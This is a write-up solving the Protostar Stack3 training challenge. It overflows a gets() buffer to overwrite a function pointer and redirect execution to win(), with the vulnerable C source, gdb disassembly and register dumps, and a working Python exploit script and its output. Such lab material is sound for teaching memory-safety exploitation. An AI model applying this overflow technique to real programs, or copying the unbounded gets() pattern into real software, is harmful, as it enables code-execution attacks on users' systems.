Our goal is to solve this explotation challenge <i> [Stack3](https://exploit.education/protostar/stack-three/)</i>
by redirecting code to function win

# Code to exploit 
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}

```
## Problem of code
In this code we have a function-pointer placed in stack, which will be called if its value 
is different than zero. We also have a gets function which is dangerous because it doesn't 
know in advance how many characters will be read.


We will execute the programm with gdb to have a view of the assembly code.

```

0x08048438 <main+0>:	push   %ebp
0x08048439 <main+1>:	mov    %esp,%ebp
0x0804843b <main+3>:	and    $0xfffffff0,%esp
0x0804843e <main+6>:	sub    $0x60,%esp
0x08048441 <main+9>:	movl   $0x0,0x5c(%esp)
0x08048449 <main+17>:	lea    0x1c(%esp),%eax
0x0804844d <main+21>:	mov    %eax,(%esp)
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmpl   $0x0,0x5c(%esp)
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    $0x8048560,%eax
0x08048461 <main+41>:	mov    0x5c(%esp),%edx
0x08048465 <main+45>:	mov    %edx,0x4(%esp)
0x08048469 <main+49>:	mov    %eax,(%esp)
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    0x5c(%esp),%eax
0x08048475 <main+61>:	call   *%eax
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret  

```

The problem in this case is when we move a value from the stack to %eax and then call %eax.

```

0x08048471 <main+57>:   mov    0x5c(%esp),%eax
0x08048475 <main+61>:   call   *%eax

```

We pass as programm input a huge string "AAAABBBBCCCC..." and then we see that %eax 
will be equal to 0x51515151 before <main+61>.


```

0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    0x5c(%esp),%eax
0x08048475 <main+61>:	call   *%eax
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret    
End of assembler dump.
(gdb) b *main +61
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r < /home/user/tmp 
Starting program: /opt/protostar/bin/stack3 < /home/user/tmp
calling function pointer, jumping to 0x51515151

Breakpoint 1, 0x08048475 in main (argc=1448498774, argv=0x57575757) at stack3/stack3.c:22
22	stack3/stack3.c: No such file or directory.
	in stack3/stack3.c
(gdb) info registers 
eax            0x51515151	1364283729
ecx            0x0	0
edx            0xb7fd9340	-1208118464


```

We know that the ASCII value 0x51 is letter Q so our exploit string will be 
"AAAABBBBCCCC....OOOOPPPP"+ the address of function win 

We obtain from gdb the address of function win

```
(gdb) x win
0x8048424 <win>:	0x83e58955

```

And then with this python code we will do the final explotation

```

import struct

#This function generates a string like AAAABBBBCCCC so that we can find some information 
#when we overflow gets function. Characters like AAAABBBBCCCC have easy to recognise hex values

def create_overflow_string(size):
        string = ""
        for i in range(size):
                if (i <26):
                        string = string + str(chr(65+i))*4
        return string

RANDOM_STRING_OVERFLOW = False
#RANDOM_STRING_OVERFLOW = True


#Find stack information
if (RANDOM_STRING_OVERFLOW == True ):
        string = create_overflow_string(26)
        print(string)

#Actual exploit
else:
        string = create_overflow_string(26)

        string = string.split("QQQQ")[0]
        string = string + struct.pack("I",0x08048424)

        print(string)

```


Finally we run like 

```
user@protostar:~$ python stack3.py | /opt/protostar/bin/stack3

calling function pointer, jumping to 0x08048424
code flow successfully changed

user@protostar:~$ 

```

